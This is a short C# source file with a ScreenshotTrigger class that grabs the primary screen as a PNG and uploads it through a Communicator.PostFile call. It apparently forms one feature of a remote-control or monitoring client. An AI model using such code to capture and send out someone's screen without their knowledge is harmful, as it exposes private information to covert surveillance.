using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading.Tasks;
using True.Core;

namespace True.Features
{
    public static class ScreenshotTrigger
    {
        public static async Task CaptureAndSend()
        {
            try
            {
                Logger.Info("Screenshot", "Capturing screenshot...");

                var bounds = Screen.PrimaryScreen.Bounds;
                using var bitmap = new Bitmap(bounds.Width, bounds.Height);
                using var graphics = Graphics.FromImage(bitmap);
                graphics.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size);

                using var ms = new MemoryStream();
                bitmap.Save(ms, ImageFormat.Png);
                byte[] screenshotBytes = ms.ToArray();

                await Communicator.PostFile("screenshot", screenshotBytes, "screen.png");
            }
            catch (Exception ex)
            {
                Logger.Error("Screenshot", $"Failed to capture screenshot: {ex.Message}");
            }
        }
    }
}
